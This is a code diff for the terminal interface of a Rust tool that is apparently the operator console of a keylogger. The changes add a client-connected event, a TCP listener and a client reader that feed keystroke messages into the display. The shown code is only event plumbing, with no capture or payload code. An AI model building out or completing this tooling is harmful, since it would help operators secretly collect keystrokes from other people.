@@ -1,3 +1,5 @@
+use std::net::{TcpStream, SocketAddr};
+
 use color_eyre::Result;
 use crossterm::event::{KeyCode, KeyEvent};
 use ratatui::layout::{Constraint, Layout, Rect};
@@ -6,11 +8,14 @@ use ratatui::style::{Color, Style};
 use ratatui::widgets::{Block, Borders, List, ListItem, Paragraph, Tabs};
 use ratatui::{DefaultTerminal, Frame};
 
+use crate::app::AppEvent::ClientConnected;
+
 use super::Core;
 
 pub enum AppEvent {
     Keylogger(String),
     Terminal(KeyEvent),
+    ClientConnected(TcpStream, SocketAddr),
 }
 
 pub struct TabsState<'a> {
@@ -124,26 +129,18 @@ impl<'a> App<'a> {
     }
 
     pub fn run(&mut self, terminal: &mut DefaultTerminal) -> Result<()> {
-        self.core.start_listeners();
-
-        let addr = {
-            let addr_guard = self.core.addr.lock().unwrap();
-            *addr_guard
-        };
-
-        match addr {
-            Some(addr) => {
-                self.messages.push(format!("[*] client is connected from {}", addr));
-            },
-            None => {
-                self.messages.push(format!("[*] waiting for client connection ..."));
-            }
-        }
-
         terminal.draw(|frame| self.render(frame))?;
+
+        self.messages.push(format!("[*] waiting for client connection ..."));
+        self.core.start_terminal_key_events();
+        self.core.start_tcp_listener();
 
         while let Ok(event) = self.core.receiver.recv() {
             match event {
+                ClientConnected(stream, addr) => {
+                    self.messages.push(format!("[*] client is connected from {}", addr));
+                    self.core.start_client_reader(stream);
+                },
                 AppEvent::Terminal(key) => {
                     match key.code {
                         KeyCode::Enter => self.submit_instructions(),
